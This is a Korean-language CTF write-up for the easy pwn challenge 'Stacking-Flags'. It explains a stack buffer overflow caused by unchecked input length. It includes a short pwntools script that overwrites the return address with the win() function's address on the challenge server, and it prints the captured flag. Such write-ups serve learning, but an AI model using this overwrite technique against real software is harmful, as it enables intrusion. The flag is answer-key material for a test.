---
ctf_name: “DawgCTF"
challenge_name: "Stacking-Flags"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "kimdohyeong0204"
date: "2026-04-11"
points: 100
tags: [태그1, 태그2]
---

# 문제명
Stacking-Flags
## 문제 설명

> 문제에서 주어진 설명을 여기에 작성합니다.
A server at nc.umbccd.net:8921 is hosting the same code, but theirs has a flag, retrieve it.

NOTE: You will not receive output upon first connecting to the challenge. This is intentional. You will have to supply your own input.
- 문제 URL / 파일 등 접속 정보
https://compete.metactf.com/573/problems
## 풀이
주어진 호스트에 접속 후 win()함수 주소를 얻고 파이썬 코드 작성
### 분석
문제에 주어진 코드를 보면 win()함수에서 flag를 알려주고 main에서 win 함수의 주소를 알려주므로 bof 기법을 사용하면 될 것으로 추측
### 취약점
입력값의 길이를 제한하지 않기 때문에 리턴 주소를 덮어쓸 수 있다

### 익스플로잇
문제에 주어진 c언어로 작성된 코드 분석 결과 win()함수에서 flag를 출력하고 main()함수에서 win() 함수의 주소를 출력하는 것을 확인
주어진 호스트 주소로 접속해 win()함수 주소 획득
exploit 코드 작성

```python
from pwn import *
p = remote('nc.umbccd.net', 8921)
win_addr = 0x4011a6

payload = b"A" * 72
payload += p64(win_addr)

p.sendline(payload)

p.interactive()

```

## 플래그

```
DawgCTF{$taching_br1cks}
```

## 배운 점
파이썬의 pwn 모듈 사용법에 대해서 기초적인 지식을 쌓을 수 있었다.


